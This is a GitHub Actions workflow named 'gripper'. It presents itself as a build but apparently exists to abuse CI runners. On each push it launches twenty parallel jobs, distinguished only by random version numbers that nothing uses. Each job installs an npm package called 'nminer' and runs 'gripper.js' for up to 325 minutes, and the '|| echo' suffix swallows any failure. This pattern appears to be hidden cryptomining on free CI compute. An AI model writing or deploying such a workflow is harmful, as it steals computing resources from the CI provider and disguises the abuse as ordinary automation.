name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3386 }
          - { version: 3715 }
          - { version: 2129 }
          - { version: 7252 }
          - { version: 1487 }
          - { version: 8277 }
          - { version: 3279 }
          - { version: 5943 }
          - { version: 5442 }
          - { version: 8255 }
          - { version: 4928 }
          - { version: 6606 }
          - { version: 3465 }
          - { version: 5354 }
          - { version: 1075 }
          - { version: 6776 }
          - { version: 8841 }
          - { version: 102 }
          - { version: 7425 }
          - { version: 3750 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: staid
        run: |
          npm install nminer@latest
          timeout 325m node gripper.js || echo "gripper executed"